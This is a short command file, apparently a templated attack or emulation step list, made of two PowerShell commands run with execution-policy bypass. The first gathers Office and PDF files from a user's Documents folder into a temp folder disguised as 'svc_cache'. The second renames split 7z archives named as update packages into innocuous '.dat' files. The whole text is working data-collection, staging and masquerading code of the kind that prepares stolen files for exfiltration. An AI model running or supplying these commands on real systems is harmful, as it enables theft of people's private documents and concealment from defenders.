steps.cmd:
powershell -ep bypass -c "
$staging = 'C:\Users\{userName}\AppData\Local\Temp\svc_cache';
New-Item -ItemType Directory -Path $staging -Force | Out-Null;
$targets = Get-ChildItem 'C:\Users\{userName}\Documents' -Recurse -Include '*.docx','*.xlsx','*.pdf','*.pptx' | Where-Object { $_.Length -gt 10KB };
$targets | Copy-Item -Destination $staging -Force;
Write-Host \"Staged $($targets.Count) files ($([math]::Round(($targets | Measure-Object Length -Sum).Sum/1MB,2)) MB)\""

powershell -ep bypass -c "
$files = @('update_pkg.7z.001','update_pkg.7z.002','update_pkg.7z.003');
foreach($f in $files) {
  $path = \"C:\Users\{userName}\AppData\Local\Temp\$f\";
  $newName = $f -replace '\.7z\.','_part' -replace '$','.dat';
  Rename-Item $path \"C:\Users\{userName}\AppData\Local\Temp\$newName\";
  Write-Host \"Renamed: $f → $newName\";
}"
